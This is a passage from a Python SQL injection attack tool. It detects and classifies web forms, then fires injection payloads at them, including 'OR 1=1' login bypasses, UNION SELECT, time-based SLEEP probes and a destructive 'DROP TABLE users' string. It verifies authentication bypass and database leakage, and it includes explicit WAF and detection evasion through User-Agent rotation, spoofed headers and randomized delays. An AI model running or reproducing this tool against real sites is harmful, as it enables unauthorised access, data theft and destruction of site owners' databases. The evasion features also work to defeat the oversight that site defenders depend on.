                            {"type": "hidden", "name": "token", "value": ""}
                        ] 
                    }
                    
                    # Set up for testing
                    try:
                        response = self.session.get(endpoint_url, timeout=5)
                        self.original_responses[endpoint_url] = response
                    except Exception as e:
                        print(HackerStyle.warning(f"Could not access endpoint {endpoint_url}: {e}"))
            else:
                print(HackerStyle.warning("No JavaScript authentication endpoints found"))
                    
        except Exception as e:
            print(HackerStyle.error(f"Error analyzing JavaScript auth: {e}"))
            
    # Enhanced form detection function
    def detect_form_type(self, form):
        """Enhanced detection of form types with better heuristics"""
        inputs = form.find_all('input')
        
        # Check for presence of specific input types
        has_password = any(input_tag.get('type') == 'password' for input_tag in inputs)
        has_email = any(input_tag.get('type') == 'email' or 
                        'email' in (input_tag.get('name', '').lower() or '') or
                        'mail' in (input_tag.get('placeholder', '').lower() or '') 
                        for input_tag in inputs)
        has_username = any('user' in (input_tag.get('name', '').lower() or '') or
                           'login' in (input_tag.get('name', '').lower() or '') or
                           'name' in (input_tag.get('name', '').lower() or '') or
                           'account' in (input_tag.get('name', '').lower() or '')
                           for input_tag in inputs)
        
        # More comprehensive check for search forms
        has_search = any(input_tag.get('type') == 'search' or 
                         'search' in (input_tag.get('name', '').lower() or '') or
                         'query' in (input_tag.get('name', '').lower() or '') or
                         'find' in (input_tag.get('name', '').lower() or '') or
                         'filter' in (input_tag.get('name', '').lower() or '')
                         for input_tag in inputs)
        
        # Check for CSRF tokens and hidden fields
        has_csrf = any('csrf' in (input_tag.get('name', '').lower() or '') or 
                       'token' in (input_tag.get('name', '').lower() or '')
                       for input_tag in inputs if input_tag.get('type') == 'hidden')
        
        # Check for OAuth-related fields
        has_oauth = any('oauth' in (input_tag.get('name', '').lower() or '') or 
                        'auth' in (input_tag.get('name', '').lower() or '')
                        for input_tag in inputs if input_tag.get('type') == 'hidden')
        
        # Check for multi-factor auth indicators
        has_mfa = any('otp' in (input_tag.get('name', '').lower() or '') or 
                      'code' in (input_tag.get('name', '').lower() or '') or
                      'verify' in (input_tag.get('name', '').lower() or '') or
                      'factor' in (input_tag.get('name', '').lower() or '')
                      for input_tag in inputs)
        
        # Form text might give additional clues
        form_text = form.get_text().lower()
        login_keywords = ['login', 'sign in', 'log in', 'signin', 'authenticate', 'access', 'enter']
        register_keywords = ['register', 'sign up', 'signup', 'create account', 'join', 'new user']
        search_keywords = ['search', 'find', 'query', 'lookup', 'filter', 'browse']
        contact_keywords = ['contact', 'message', 'feedback', 'send', 'support']
        
        # Check form action for clues (many login forms post to login.php, auth.php, etc.)
        form_action = form.get('action', '').lower()
        login_action_keywords = ['login', 'auth', 'signin', 'authenticate', 'session']
        
        # Check for external OAuth providers in action URL
        oauth_providers = ['google', 'facebook', 'twitter', 'github', 'microsoft', 'apple']
        is_oauth_form = any(provider in form_action for provider in oauth_providers)
        
        # Examine the presence of social login buttons
        social_login_elements = form.select('button[class*="social"], a[class*="social"], .google, .facebook, .twitter, .github, .apple')
        has_social_login = len(social_login_elements) > 0
        
        # Comprehensive form type determination
        if has_mfa:
            return "multi_factor_auth"
        elif is_oauth_form or has_oauth or has_social_login:
            return "oauth_login"
        elif has_password:
            if any(keyword in form_text for keyword in register_keywords):
                return "registration"
            elif has_email and has_username:
                return "login_with_email_username" 
            elif has_email:
                return "login_with_email"
            elif has_username:
                return "login_with_username"
            elif any(keyword in form_action for keyword in login_action_keywords):
                return "login_by_action" 
            elif any(keyword in form_text for keyword in login_keywords):
                return "login_by_text"
            else:
                return "login_generic"
        elif has_search or any(keyword in form_text for keyword in search_keywords):
            return "search"
        elif any(keyword in form_text for keyword in contact_keywords):
            return "contact"
        elif has_email and not has_password:
            if any(keyword in form_text for keyword in register_keywords):
                return "newsletter_signup"
            else:
                return "email_form"
        else:
            return "generic_form"

    def analyze_form_inputs(self, form, page_url):
        """Analyze form inputs to determine their purpose and type"""
        inputs = form.find_all(["input", "textarea", "select"])
        form_details = self.get_form_details(form)
        
        print(HackerStyle.info(f"Analyzing form at {form_details['action']}"))
        
        # Identify form inputs and their purposes
        identified_inputs = []
        
        for input_tag in inputs:
            input_type = input_tag.name
            if input_type == "input":
                input_type = input_tag.get("type", "text")
                
            name = input_tag.get("name", "")
            id_attr = input_tag.get("id", "")
            placeholder = input_tag.get("placeholder", "")
            css_class = input_tag.get("class", "")
            value = input_tag.get("value", "")
            
            # Skip buttons and submit inputs
            if input_type in ["submit", "button", "image", "reset", "file"]:
                continue
                
            # Skip inputs without names (they can't be submitted)
            if not name:
                continue
            
            # Check for username or email based on HTML attributes
            is_username = False
            is_email = False
            is_password = False
            is_search = False
            is_token = False
            
            # Check input type
            if input_type == "email":
                is_email = True
            elif input_type == "password":
                is_password = True
            elif input_type == "search":
                is_search = True
            elif input_type == "hidden":
                if any(token_name in name.lower() for token_name in ["token", "csrf", "nonce"]):
                    is_token = True
            
            # Check name attribute
            if not is_username and not is_email:
                if any(username_name in name.lower() for username_name in ["username", "user", "login", "name", "account"]):
                    is_username = True
                elif any(email_name in name.lower() for email_name in ["email", "mail", "e-mail"]):
                    is_email = True
            
            # Check placeholder
            if not is_username and not is_email:
                if placeholder:
                    if any(username_hint in placeholder.lower() for username_hint in ["username", "user", "login", "name", "account"]):
                        is_username = True
                    elif any(email_hint in placeholder.lower() for email_hint in ["email", "mail", "e-mail"]):
                        is_email = True
            
            # Check id attribute
            if not is_username and not is_email:
                if id_attr:
                    if any(username_id in id_attr.lower() for username_id in ["username", "user", "login", "name", "account"]):
                        is_username = True
                    elif any(email_id in id_attr.lower() for email_id in ["email", "mail", "e-mail"]):
                        is_email = True
            
            # Determine the input purpose
            input_purpose = "unknown"
            if is_username:
                input_purpose = "username"
            elif is_email:
                input_purpose = "email"
            elif is_password:
                input_purpose = "password"
            elif is_search:
                input_purpose = "search"
            elif is_token:
                input_purpose = "token"
            else:
                input_purpose = "generic"
            
            # Create a detailed input description
            input_details = {
                "name": name,
                "type": input_type,
                "purpose": input_purpose,
                "value": value
            }
            
            identified_inputs.append(input_details)
            print(HackerStyle.info(f"  - Input: {name} (Type: {input_type}, Purpose: {input_purpose})"))
        
        return identified_inputs

    def detect_forms(self, soup, page_url):
        """Detect and analyze forms on the page in detail"""
        forms = soup.find_all('form')
        
        for form in forms:
            form_details = self.get_form_details(form)
            
            # Analyze the form's inputs
            inputs = self.analyze_form_inputs(form, page_url)
            
            # Determine form purpose based on its inputs
            form_type = self.determine_form_type(form, inputs)
            
            # Store form details with input types
            if form_details['action'] not in self.detected_forms:
                self.detected_forms[form_details['action']] = {
                    "type": form_type,
                    "inputs": inputs
                }
            
            # Extract CSRF tokens if present
            csrf_fields = [input_field for input_field in form_details['inputs'] 
                          if input_field['name'] and ('csrf' in input_field['name'].lower() or 
                                                     'token' in input_field['name'].lower())]
            
            for csrf_field in csrf_fields:
                if csrf_field['name'] and csrf_field['value']:
                    self.csrf_tokens[form_details['action']] = {
                        'name': csrf_field['name'],
                        'value': csrf_field['value']
                    }

    def determine_form_type(self, form, inputs):
        """Determine form type based on its inputs and attributes"""
        # Count input purposes
        input_types = {input_detail["purpose"]: 0 for input_detail in inputs}
        for input_detail in inputs:
            input_types[input_detail["purpose"]] += 1
        
        # Form attributes
        form_action = form.get("action", "").lower()
        form_id = form.get("id", "").lower()
        form_class = form.get("class", "")
        form_text = form.get_text().lower()
        
        # Check for login form indicators
        login_keywords = ["login", "sign in", "log in", "signin", "authenticate"]
        login_actions = ["login", "auth", "authenticate", "signin"]
        
        # Check for registration form indicators
        register_keywords = ["register", "sign up", "signup", "create account", "join"]
        
        # Check for search form indicators
        search_keywords = ["search", "find", "query", "lookup"]
        
        # Determine form type based on inputs and keywords
        if input_types.get("password", 0) > 0:
            # Has password field - likely authentication
            if input_types.get("email", 0) > 0 and input_types.get("username", 0) > 0:
                return "login_with_email_username"
            elif input_types.get("email", 0) > 0:
                return "login_with_email"
            elif input_types.get("username", 0) > 0:
                return "login_with_username"
            # Check for registration vs login
            elif any(keyword in form_text for keyword in register_keywords):
                return "registration"
            elif any(keyword in form_text for keyword in login_keywords) or any(action in form_action for action in login_actions):
                return "login_generic"
            else:
                return "password_form"
        
        # Search forms
        elif input_types.get("search", 0) > 0 or any(keyword in form_text for keyword in search_keywords):
            return "search_form"
        
        # Email subscription forms
        elif input_types.get("email", 0) > 0 and input_types.get("password", 0) == 0:
            return "email_subscription"
        
        # Check form action for clues
        for action_type in ["login", "search", "register", "contact", "subscribe"]:
            if action_type in form_action:
                return f"{action_type}_form"
        
        # Default to generic if no specific type detected
        return "generic_form"

    def fetch_original_responses(self):
        """Fetch original responses for different forms"""
        try:
            # Iterate through detected forms
            for form_url, form_type in self.detected_forms.items():
                if form_url not in self.original_responses:
                    try:
                        print(HackerStyle.info(f"Fetching original response for {form_url}"))
                        response = self.session.get(form_url, cookies=self.cookies, timeout=10)
                        self.original_responses[form_url] = response
                    except Exception as e:
                        print(HackerStyle.error(f"Error fetching original response for {form_url}: {e}"))
        except Exception as e:
            print(HackerStyle.error(f"Error in fetch_original_responses: {e}"))

    def fetch_forms(self):
        """Fetch forms from the target URL"""
        try:
            res = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(res.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(HackerStyle.error(f"Error fetching forms: {e}"))
            return []

    def get_form_details(self, form):
        """Extract detailed information from a form"""
        details = {}
        
        # Get the action URL
        action = form.attrs.get("action", "")
        # If action is empty, use the current page URL
        if not action:
            action = self.target
            
        method = form.attrs.get("method", "get").lower()
        
        # Process all form inputs
        inputs = []
        for input_tag in form.find_all(["input", "textarea", "select"]):
            input_type = input_tag.name
            
            if input_type == "input":
                input_type = input_tag.attrs.get("type", "text")
                
            name = input_tag.attrs.get("name")
            value = input_tag.attrs.get("value", "")
            placeholder = input_tag.attrs.get("placeholder", "")
            
            # For select tags, get the options and default value
            if input_type == "select":
                options = []
                for option in input_tag.find_all("option"):
                    options.append(option.attrs.get("value", option.text))
                input_details = {
                    "type": input_type,
                    "name": name,
                    "options": options,
                    "value": input_tag.find("option", selected=True).attrs.get("value", "") if input_tag.find("option", selected=True) else ""
                }
            else:
                input_details = {
                    "type": input_type,
                    "name": name,
                    "value": value,
                    "placeholder": placeholder
                }
                
            # Only include inputs that have a name (anonymous inputs can't be submitted)
            if name:
                inputs.append(input_details)
        
        details["action"] = urljoin(self.target, action)
        details["method"] = method
        details["inputs"] = inputs
        return details

    def scan_form(self, form_url, form_info):
        """Scan a form with targeted payloads based on input analysis"""
        print(HackerStyle.header(f"Scanning {form_info['type']} form at {form_url}"))
        
        try:
            # Get the form HTML
            response = self.session.get(form_url, cookies=self.cookies, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                print(HackerStyle.warning(f"No forms found at {form_url}"))
                return
                
            # Process each form input with targeted payloads
            for form in forms:
                form_details = self.get_form_details(form)
                
                # Skip if it's not the form we're looking for
                if form_details['action'] != form_url:
                    continue
                    
                # Generate payloads for each input based on its purpose
                for input_detail in form_info["inputs"]:
                    input_name = input_detail["name"]
                    
                    # Skip submit buttons, etc.
                    if input_detail["type"] in ["submit", "button", "image", "file", "reset"]:
                        continue
                        
                    # Generate targeted payloads
                    payloads = self.generate_targeted_payloads(input_detail)
                    
                    print(HackerStyle.info(f"Testing {input_detail['purpose']} input: {input_name} with {len(payloads)} payloads"))
                    
                    # Queue payloads for testing
                    for payload in payloads:
                        self.queue.put((form_details, input_detail, payload, form_info["type"]))
        except Exception as e:
            print(HackerStyle.error(f"Error processing form at {form_url}: {e}"))

    def generate_input_specific_payload(self, input_field, form_type):
        """Generate more precise payloads with better testing strategy"""
        input_type = input_field["type"]
        input_name = input_field["name"] if input_field["name"] else ""
        input_placeholder = input_field.get("placeholder", "")
        
        # Define small but effective payload sets for different input types
        if input_type == "password":
            return [
                "' OR 1=1 --",
                "' OR '1'='1",
                "password' OR '1'='1",
                "xxx' OR 1='1"
            ]
        elif input_type == "email" or "email" in input_name.lower() or "mail" in input_placeholder.lower():
            return [
                "admin@example.com' OR 1=1--",
                "test@test.com' UNION SELECT 1,2,3--",
                "a@a.com' OR 1=1--"
            ]
        elif input_type == "search" or "search" in input_name.lower() or "query" in input_name.lower():
            return [
                "test' UNION SELECT 1,2,3 --",
                "%' OR 1=1 --",
                "test' OR '1'='1"
            ]
        elif input_type == "number" or input_type == "range":
            return [
                "1 OR 1=1",
                "1; DROP TABLE users--",
                "1 UNION SELECT 1,2,3 --"
            ]
        elif input_type == "hidden":
            return [
                "1' OR '1'='1",
                "' OR 1=1 --"
            ]
        elif "user" in input_name.lower() or "login" in input_name.lower() or "name" in input_name.lower():
            return [
                "admin' --",
                "admin' OR '1'='1",
                "' OR username LIKE '%admin%'--"
            ]
        else:
            # Use a small, targeted set of generic payloads
            generic_payloads = [
                "' OR 1=1 --", 
                "' OR '1'='1",
                "admin' --"
            ]
            
            # Add an appropriate blind payload for verification
            blind_payloads = [
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND SUBSTRING((SELECT TOP 1 name FROM users),1,1)='a'--"
            ]
            
            # Combine with a time-based payload based on the database type we suspect
            time_based = []
            
            # Try to determine database type from page content or URL
            if "mysql" in self.target.lower() or "php" in self.target.lower():
                time_based = ["' AND SLEEP(1)--"]
            elif "asp" in self.target.lower() or "mssql" in self.target.lower():
                time_based = ["' AND WAITFOR DELAY '0:0:1'--"]
            elif "postgres" in self.target.lower() or "pg" in self.target.lower():
                time_based = ["' AND pg_sleep(1)--"]
            else:
                # Add one from each type as we don't know the database
                time_based = [
                    "' AND SLEEP(1)--",
                    "' AND pg_sleep(1)--",
                    "' AND WAITFOR DELAY '0:0:1'--"
                ]
                
            return generic_payloads + blind_payloads + time_based[:1]  # Just add one time-based payload

    def submit_form(self, form_details, target_input_name, payload, form_type):
        """Enhanced form submission with support for various authentication mechanisms"""
        data = {}
        
        # Prepare form data with the payload injected into the target input
        for input_field in form_details["inputs"]:
            input_name = input_field["name"]
            
            # Skip inputs without names (they can't be submitted)
            if not input_name:
                continue
                
            # Inject payload into the target input
            if input_name == target_input_name:
                data[input_name] = payload
            else:
                # For other inputs, use default values or appropriate fillers
                input_type = input_field["type"]
                
                # Check if this is a CSRF token field
                is_csrf = "csrf" in input_name.lower() or "token" in input_name.lower()
                
                if is_csrf and form_details["action"] in self.csrf_tokens:
                    # Use the stored CSRF token
                    data[input_name] = self.csrf_tokens[form_details["action"]]["value"]
                elif input_type == "hidden":
                    # Use the default value for hidden fields
                    data[input_name] = input_field["value"]
                elif input_type == "password":
                    # Use a common password for password fields
                    data[input_name] = "Password123!"
                elif input_type == "email":
                    # Use a valid email format for email fields
                    data[input_name] = "test@example.com"
                elif input_type == "checkbox":
                    # Check boxes are typically checked
                    data[input_name] = input_field.get("value", "on")
                elif input_type == "radio":
                    # Use the provided value for radio buttons
                    data[input_name] = input_field["value"]
                elif input_type == "select":
                    # Use the first option for select fields
                    data[input_name] = input_field["options"][0] if input_field["options"] else ""
                elif form_type == "multi_factor_auth" and (
                        "code" in input_name.lower() or 
                        "otp" in input_name.lower() or 
                        "factor" in input_name.lower()):
                    # Use common OTP values for MFA fields
                    data[input_name] = "123456"
                else:
                    # For other types, use a generic value or the default value
                    data[input_name] = input_field.get("value", "test")
        
        # Print submission details for debugging
        print(HackerStyle.info(f"Submitting {form_details['method'].upper()} to {form_details['action']}"))
        print(HackerStyle.info(f"Input: {target_input_name}, Payload: {payload}"))
        
        # For JSON-based APIs, we may need to convert the data
        headers = self.headers.copy()
        json_data = None
        
        # Check if this might be a JSON API endpoint
        if form_type == "js_authentication" or "api" in form_details["action"].lower():
            # Prepare a JSON version of the data
            json_data = {}
            for key, value in data.items():
                json_data[key] = value
                
            # Set content type to JSON
            headers["Content-Type"] = "application/json"
            
            # For debugging
            print(HackerStyle.info(f"JSON payload: {json.dumps(json_data)}"))
        
        # Add random delay to avoid rate limiting
        delay = random.uniform(0.2, 1.0)
        time.sleep(delay)
        
        try:
            # Submit the form based on the method
            if form_details["method"] == "post":
                if json_data:
                    # JSON API submission
                    return self.session.post(
                        form_details["action"], 
                        json=json_data,
                        headers=headers,
                        cookies=self.cookies,
                        allow_redirects=True,
                        timeout=15
                    )
                else:
                    # Regular form submission
                    return self.session.post(
                        form_details["action"], 
                        data=data, 
                        headers=headers,
                        cookies=self.cookies,
                        allow_redirects=True,
                        timeout=15
                    )
            else:
                # GET method
                return self.session.get(
                    form_details["action"], 
                    params=data, 
                    headers=headers,
                    cookies=self.cookies,
                    allow_redirects=True,
                    timeout=15
                )
        except requests.exceptions.RequestException as e:
            print(HackerStyle.error(f"Request failed: {e}"))
            return None

    def apply_evasion_techniques(self):
        """Apply techniques to avoid detection and bypass WAF"""
        # Randomize the User-Agent for each set of requests
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ]
        
        # Select a random user agent
        self.headers['User-Agent'] = random.choice(user_agents)
        
        # Add some randomization to request timing
        self.request_delay_min = 1.0
        self.request_delay_max = 3.0
        
        # Randomize request order
        self.randomize_requests = True
        
        # Implement exponential backoff for rate limiting
        self.max_retries = 3
        self.backoff_factor = 2
        
        # Session handling improvements
        self.session.cookies.clear()  # Start with fresh cookies
        
        # Update headers with more realistic browser values
        self.headers.update({
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': self.target,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache'
        })
        
        # Apply headers to session
        self.session.headers.update(self.headers)
        
        print(HackerStyle.info("Applied evasion techniques to avoid detection"))

    def worker(self):
        """Worker method with improved verification for auth bypass"""
        while not self.queue.empty():
            form_details, input_field, payload, form_type = self.queue.get()
            try:
                # Get original response for this specific form/page
                original_response = self.original_responses.get(form_details['action'])
                
                # If no original response, skip
                if not original_response:
                    self.queue.task_done()
                    continue
                
                # Submit form with injection payload
                injection_response = self.submit_form(
                    form_details, 
                    input_field["name"], 
                    payload, 
                    form_type
                )
                
                # Special handling for login forms
                is_login_form = "login" in form_type.lower()
                is_username_or_password = input_field["name"].lower() in ["tbusername", "tbpassword", "username", "password", "email"]
                auth_bypass_detected = False
                
                if is_login_form and is_username_or_password and injection_response:
                    # Check for authentication success indicators
                    auth_indicators = ["logout", "sign out", "welcome", "dashboard", "account"]
                    if any(indicator in injection_response.text.lower() for indicator in auth_indicators):
                        # Verify this is actually an auth bypass by checking with invalid credentials
                        invalid_creds = "xyz_invalid_user_123"
                        invalid_response = self.submit_form(
                            form_details,
                            input_field["name"],
                            invalid_creds,
                            form_type
                        )
                        
                        # If invalid fails but payload works, it's an auth bypass
                        if invalid_response and not any(indicator in invalid_response.text.lower() for indicator in auth_indicators):
                            auth_bypass_detected = True
                            print(HackerStyle.success(f"AUTHENTICATION BYPASS detected with payload: {payload}"))
                            self.results.append((payload, form_details["action"], form_type))
                
                # If not an auth bypass, try general SQL injection detection
                if not auth_bypass_detected:
                    # Detect if injection was successful
                    if injection_response and self.detect_successful_injection(original_response, injection_response, payload, form_type):
                        # Run verification to confirm it's not a false positive
                        if self.verify_vulnerability(form_details, input_field, payload, form_type):
                            vuln_msg = f"CONFIRMED Vulnerability: {payload} in {input_field['name']} -> {form_details['action']}"
                            print(HackerStyle.success(vuln_msg))
                            self.results.append((payload, form_details["action"], form_type))
                        else:
                            print(HackerStyle.warning(f"Potential false positive rejected: {payload} in {input_field['name']}"))
                    else:
                        print(HackerStyle.info(f"No vulnerability detected with: {payload} in {input_field['name']}"))
            except Exception as e:
                print(HackerStyle.error(f"Error processing payload: {e}"))
            finally:
                self.queue.task_done()
    
    def detect_successful_injection(self, original_response, injection_response, payload, form_type):
        """Advanced detection with strict verification to eliminate false positives"""
        if not original_response or not injection_response:
            return False
    
        # Convert to lowercase for case-insensitive comparison
        orig_text = original_response.text.lower()
        inj_text = injection_response.text.lower()
        
        # Check for DEFINITIVE signs of SQL injection success:
        
        # 1. Check for direct database content exposure (most reliable indicator)
        db_content_exposed = False
        
        # Database record patterns (looking for structured data that appears to be from a database)
        db_patterns = [
            r'<td>\s*\d+\s*</td>\s*<td>[^<]+</td>\s*<td>[^<]+</td>', # Table with numeric ID and other columns
            r'{"id":\s*\d+,\s*"username":\s*"[^"]+",\s*"email":\s*"[^"]+"', # JSON user data
            r'\[\s*\d+,\s*"[^"]+",\s*"[^"]+"\s*\]', # Array of database records
            r'userid=\d+&username=[^&]+', # URL params with database values
        ]
        
        for pattern in db_patterns:
            if re.search(pattern, inj_text) and not re.search(pattern, orig_text):
                db_content_exposed = True
                print(HackerStyle.success(f"DATABASE CONTENT EXPOSED with pattern: {pattern}"))
                break
        
        # 2. Check for SQL errors that reveal database structure (strong evidence)
        sql_structure_revealed = False
        structure_patterns = [
            r'error.*?near\s+[\'"][^\'";]+[\'"]', # SQL syntax error revealing query structure
            r'unclosed.*?quotation.*?mark',  # Quote matching errors
            r'unterminated.*?string',        # String termination errors
            r'column\s+[\'"]([^\'";]+)[\'"].*?not\s+found', # Column not found errors
            r'no\s+such\s+table:\s+([^\s;]+)', # Table not found errors
            r'unknown\s+column\s+[\'"]([^\'";]+)[\'"]', # Unknown column errors
        ]
        
        for pattern in structure_patterns:
            match = re.search(pattern, inj_text, re.IGNORECASE)
            if match and not re.search(pattern, orig_text, re.IGNORECASE):
                sql_structure_revealed = True
                print(HackerStyle.success(f"DATABASE STRUCTURE REVEALED: {match.group(0)}"))
                break
        
        # 3. For authentication forms, require clear evidence of successful login
        auth_bypassed = False
        if form_type in ["login_with_username", "login_with_email", "login_generic", "login_with_email_username"]:
            # Check for definitive login success indicators
            login_success_patterns = [
                # Admin/user dashboard indicators
                r'<h1[^>]*>\s*(?:welcome|dashboard|admin\s+panel|control\s+panel)\s*</h1>',
                # Username displayed after login
                r'logged\s+in\s+as\s+[\'"]?([a-z0-9_]+)[\'"]?',
                # Session information indicators
                r'<div[^>]*id=[\'"]?user-info[\'"]?[^>]*>',
                # Explicit login success messages
                r'(login|authentication)\s+(successful|succeeded)',
                # Presence of logout button (with verification it wasn't there before)
                r'<a[^>]*href=[\'"]?[^\'"]*logout[^\'"]*[\'"]?[^>]*>[^<]*log\s*out[^<]*</a>'
            ]
            
            for pattern in login_success_patterns:
                if re.search(pattern, inj_text, re.IGNORECASE) and not re.search(pattern, orig_text, re.IGNORECASE):
                    auth_bypassed = True
                    print(HackerStyle.success(f"CONFIRMED AUTH BYPASS: {pattern}"))
                    break
        
        # 4. Time-based injection verification
        time_based_verified = False
        if any(delay_func in payload.upper() for delay_func in ['SLEEP', 'WAITFOR', 'PG_SLEEP', 'BENCHMARK']):
            # Extract expected delay time
            delay_match = re.search(r'(?:SLEEP|pg_sleep|WAITFOR\s+DELAY)\s*\(\s*(\d+)', payload, re.IGNORECASE)
            if delay_match:
                expected_delay = int(delay_match.group(1))
                actual_delay = injection_response.elapsed.total_seconds() - original_response.elapsed.total_seconds()
                
                # Verify the actual delay matches expected delay (with some tolerance)
                if actual_delay >= (expected_delay * 0.5):
                    time_based_verified = True
                    print(HackerStyle.success(f"TIME-BASED INJECTION VERIFIED: Response delayed by {actual_delay:.2f}s"))
        
        # 5. Advanced integrity checks
        response_code_matched = False
        content_type_matched = False
        
        # For successful bypasses, we typically expect the same response type but different content
        if injection_response.status_code == 200 and original_response.status_code == 200:
            response_code_matched = True
        
        if (injection_response.headers.get('Content-Type') == 
            original_response.headers.get('Content-Type')):
            content_type_matched = True
        
        # Calculate confidence score based on strength of evidence
        confidence_score = 0
        
        # Very strong evidence (80+ points)
        if db_content_exposed:
            confidence_score += 90  # Direct database content exposure is almost certain
        
        # Strong evidence (60-80 points)
        if sql_structure_revealed:
            confidence_score += 70  # SQL errors revealing structure are strong indicators
            
        if auth_bypassed:
            confidence_score += 80  # Confirmed login bypass is very reliable evidence
        
        if time_based_verified:
            confidence_score += 75  # Verified time-based delay is strong evidence
        
        # Only report a vulnerability if we have strong evidence (60+ confidence)
        is_vulnerable = confidence_score >= 60
        
        if confidence_score > 0:
            print(HackerStyle.info(f"Injection confidence score: {confidence_score}/100"))
        
        # Require response integrity checks for borderline cases
        if 60 <= confidence_score < 70 and not (response_code_matched and content_type_matched):
            is_vulnerable = False  # Downgrade if response doesn't look right
        
        return is_vulnerable

    def verify_vulnerability(self, form_details, input_field, payload, form_type):
        """Improved verification method that adapts to different injection types"""
        print(HackerStyle.info("Running verification test..."))
        
        # Store the input name for reference
        input_name = input_field["name"]
        
        # 1. Attempt a Boolean-based verification by using opposite conditions
        if "1=1" in payload:
            # Create a negative condition that should fail
            negative_payload = payload.replace("1=1", "1=2")
            
            # Submit the positive condition again to confirm
            positive_response = self.submit_form(
                form_details,
                input_name,
                payload,
                form_type
            )
            
            # Submit the negative condition
            negative_response = self.submit_form(
                form_details,
                input_name,
                negative_payload,
                form_type
            )
            
            if positive_response and negative_response:
                # Check for significant differences - looking for login vs no login
                pos_success = "logout" in positive_response.text.lower()
                neg_success = "logout" in negative_response.text.lower()
                
                # If positive succeeds and negative fails, that's a strong indicator
                if pos_success and not neg_success:
                    print(HackerStyle.success("VERIFIED: Boolean condition test confirms vulnerability"))
                    return True
                
                # Check for different content length as another indicator
                pos_len = len(positive_response.text)
                neg_len = len(negative_response.text)
                if abs(pos_len - neg_len) > 500:  # Significant difference
                    print(HackerStyle.success(f"VERIFIED: Response size differs significantly ({pos_len} vs {neg_len})"))
                    return True
        
        # 2. Check for authentication bypass specifically on login forms
        if form_type in ["login_with_username", "login_with_email", "login_generic"]:
            # Try with a completely invalid username/password combo
            invalid_response = self.submit_form(
                form_details,
                input_name,
                "invalid_user_xyz123",  # Something unlikely to work normally
                form_type
            )
            
            # Try with our payload
            payload_response = self.submit_form(
                form_details,
                input_name,
                payload,
                form_type
            )
            
            if invalid_response and payload_response:
                # Check for authentication indicators in the payload response but not invalid
                auth_indicators = [
                    "logout", "welcome", "dashboard", "account", "profile", "sign out"
                ]
                
                invalid_has_indicator = any(indicator in invalid_response.text.lower() for indicator in auth_indicators)
                payload_has_indicator = any(indicator in payload_response.text.lower() for indicator in auth_indicators)
                
                if payload_has_indicator and not invalid_has_indicator:
                    print(HackerStyle.success("VERIFIED: Authentication bypass confirmed (invalid fails, payload succeeds)"))
                    return True
                    
                # Check for redirections as authentication indicators
                if payload_response.url != invalid_response.url and "login" not in payload_response.url.lower():
                    print(HackerStyle.success(f"VERIFIED: Injection caused redirection to {payload_response.url}"))
                    return True
        
        # 3. Look for concrete signs of SQL injection in the response
        injection_response = self.submit_form(
            form_details,
            input_name,
            payload,
            form_type
        )
        
        if injection_response:
            # Check for database structure leakage
            db_leak_patterns = [
                r'<td>\s*\d+\s*</td>\s*<td>[^<]+</td>', # Table data
                r'(id|user_?id)=\d+', # URL with database IDs
                r'mysql|mssql|oracle|sqlite|postgresql', # DB technology names
                r'json.*"id":\s*\d+', # JSON with IDs
            ]
            
            for pattern in db_leak_patterns:
                if re.search(pattern, injection_response.text.lower()):
                    print(HackerStyle.success(f"VERIFIED: Database information leaked in response"))
                    return True
            
            # For login forms specifically
            if "username" in input_name.lower() or "password" in input_name.lower():
                # If we see a logout link in the response, it's likely we bypassed authentication
                if "logout" in injection_response.text.lower() or "sign out" in injection_response.text.lower():
                    # Make a verification attempt with a known bad value
                    bad_value = "surely_not_valid_123xyz"
                    verify_response = self.submit_form(
                        form_details,
                        input_name,
                        bad_value,
                        form_type
                    )
                    
                    # If bad value fails but payload works, it's confirmed
                    if verify_response and "logout" not in verify_response.text.lower():
                        print(HackerStyle.success("VERIFIED: Authentication bypass confirmed with logout presence"))
                        # This is a genuine auth bypass
                        return True
        
        # 4. For time-based injections, test delay differential
        if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper() or "PG_SLEEP" in payload.upper():
            # Extract delay value
            delay_pattern = r'(?:SLEEP|WAITFOR\s+DELAY|pg_sleep)\s*\(\s*(\d+)'
            delay_match = re.search(delay_pattern, payload, re.IGNORECASE)
            
            if delay_match:
                expected_delay = int(delay_match.group(1))
                
                # Make a normal request and time it
                start_time = time.time()
                normal_response = self.submit_form(
                    form_details,
                    input_name,
                    "normal_value",
                    form_type
                )
                normal_time = time.time() - start_time
                
                # Make a request with the time-based payload
                start_time = time.time()
                delay_response = self.submit_form(
                    form_details,
                    input_name,
                    payload,
                    form_type
                )
                delay_time = time.time() - start_time
                
                # If we observe a delay matching our expectation, it's confirmed
                if delay_time > normal_time + (expected_delay * 0.5):
                    print(HackerStyle.success(f"VERIFIED: Time-based injection confirmed ({delay_time:.2f}s vs {normal_time:.2f}s)"))
                    return True
        
        # If we didn't confirm with any method, report as potential false positive
        print(HackerStyle.warning("Verification inconclusive - treating as potential false positive"))
        return False
    
    def is_common_web_text(self, text):
        """Check if the text appears to be just common web content rather than exposed data"""
        common_patterns = [
            # HTML/CSS common fragments
